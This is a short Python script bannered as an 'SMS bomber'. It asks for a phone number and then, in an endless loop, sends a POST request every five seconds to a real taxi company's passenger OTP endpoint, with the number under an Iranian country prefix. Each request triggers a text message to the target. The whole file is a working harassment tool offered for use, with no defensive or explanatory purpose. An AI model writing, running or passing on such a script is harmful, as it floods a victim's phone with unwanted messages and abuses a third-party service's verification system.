import requests
import time
print("""db   db  .d8b.  d8888b. d8888b. d88888b d8888b.                 db   d8b   db       
88   88 d8' `8b 88  `8D 88  `8D 88'     88  `8D                 88   I8I   88       
88ooo88 88ooo88 88oobY' 88oodD' 88ooooo 88oobY'                 88   I8I   88       
88~~~88 88~~~88 88`8b   88~~~   88~~~~~ 88`8b                   Y8   I8I   88       
88   88 88   88 88 `88. 88      88.     88 `88.                 `8b d8'8b d8'       
YP   YP YP   YP 88   YD 88      Y88888P 88   YD C88888D C88888D  `8b8' `8d8'        
                                                                                    
                                                                                    
.d8888. .88b  d88. .d8888.      d8888b.  .d88b.  .88b  d88. d8888b. d88888b d8888b. 
88'  YP 88'YbdP`88 88'  YP      88  `8D .8P  Y8. 88'YbdP`88 88  `8D 88'     88  `8D 
`8bo.   88  88  88 `8bo.        88oooY' 88    88 88  88  88 88oooY' 88ooooo 88oobY' 
  `Y8b. 88  88  88   `Y8b.      88~~~b. 88    88 88  88  88 88~~~b. 88~~~~~ 88`8b   
db   8D 88  88  88 db   8D      88   8D `8b  d8' 88  88  88 88   8D 88.     88 `88. 
`8888Y' YP  YP  YP `8888Y'      Y8888P'  `Y88P'  YP  YP  YP Y8888P' Y88888P 88   YD 
                                                                                    
                                                                                    """)
phonenum = input ("entr phone (:")

urlsend = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
data = {"cellphone":"+98"+phonenum}

while True :
    requests.post(urlsend,data=data)
    print("Send")
    time.sleep(5)


